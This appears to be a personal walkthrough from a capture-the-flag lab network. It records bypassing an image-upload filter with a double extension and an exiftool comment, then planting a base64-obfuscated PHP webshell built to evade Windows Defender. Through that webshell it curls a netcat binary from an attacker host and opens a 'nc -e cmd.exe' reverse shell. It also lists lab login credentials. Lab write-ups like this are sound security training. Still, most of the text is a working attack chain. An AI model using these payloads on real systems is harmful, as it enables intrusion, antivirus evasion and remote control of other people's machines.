We can now go to 10.200.100.100/resources

We already have Thomas' creds from earlier

user: Thomas
pass: i<3ruby

We now reach the upload page.

We need to bypass the two filters discussed earlier.

The first one can be bypassed by changing the extension to `.jpeg.php`

The second getimagesize() filter we will need to use exiftool

We will also need to bypass AV on Thomas' machine

---

### Making a php script that will bypass AV

We will need to assume Windows Defender is on the machine.

We will build the payload normally then obfuscate it using tools.

```php
<?php  
    $cmd = $_GET["wreath"];  
    if(isset($cmd)){  
        echo "<pre>" . shell_exec($cmd) . "</pre>";  
    }  
    die();  
?>
```

Here we check to see if a GET parameter called "wreath" has been set. If so, we execute it using `shell_exec()`, wrapped inside HTML `<pre>` tags to give us a clean output. We then use `die()` to prevent the rest of the image from showing up as garbled text on the screen.  

This is slightly longer than the classic PHP one-liner webshell (`<?php system($_GET["cmd"]);?>`) for two reasons:

1.  If we're obfuscating it then it will become a one-liner anyway
2.  Anything _different_ is good when it comes to AV evasion

---

We now need to obfuscate this payload.

There are a variety of measures we could take here, including but not limited to:

-   Switching parts of the exploit around so that they're in an unusual order
-   Encoding all of the strings so that they're not recognisable
-   Splitting up distinctive parts of the code (e.g. `shell_exec($_GET[...])`)

We will use the tool found here:

https://www.gaijin.at/en/tools/php-obfuscator

After obfuscating the code, we also need to escape the dollar signs

`<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>`

---

We now inject this into our jpeg using exif tool

`exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" shell-k.jpeg.php`

---

Now we upload the file and try to get a shell 

We can execute commands with wreath=

`http://10.200.100.100/resources/uploads/shell-k.jpeg.php?wreath=COMMAND`

---

### full reverse shell

Realistically we have several options here:

-   Powershell tends to be the go-to for Windows reverse shells. Unfortunately Defender knows exactly what PowerShell reverse shells look like, so we'd have to do some serious obfuscation to get this to work.
-   We could try to get a PHP reverse shell as we know the target has a PHP interpreter installed. Windows PHP reverse shells tend to be iffy though, and again, may trigger Defender.
-   We could generate an executable reverse shell using msfvenom, then upload and activate it using the webshell. Again, msfvenom shells tend to be very distinctive. We could use the [Veil Framework](https://www.veil-framework.com/) to give us a meterpreter shell executable that might bypass Defender, but let's try to keep this manual for the time. Equally, [shellter](https://www.shellterproject.com/) (though old) might give us what we need. There are easier options though.
-   We could upload netcat. This is the quick and easy option.

We need a version of netcat that can bypass Windows Defender

`git clone https://github.com/int0x33/nc.exe/`

We could also cross compile netcat wtih gcc or mingw

---

WE NEED TO SEND THE nc64.exe version to the machine
(this version has already been cross compiled and will bypass AV)

`curl http://ATTACKER_IP/nc.exe -o c:\\windows\\temp\\nc-USERNAME.exe`


curl http://10.50.101.131/nc64.exe -o c:\\windows\\temp\\nc-k.exe

Now that we have nc on the box, we can send a reverse shell


`powershell.exe c:\\windows\\temp\\nc-USERNAME.exe ATTACKER_IP ATTACKER_PORT -e cmd.exe`

powershell.exe c:\\windows\\temp\\nc-k.exe 10.50.101.131 20000 -e cmd.exe

---

Now that we have a shell we can priv esc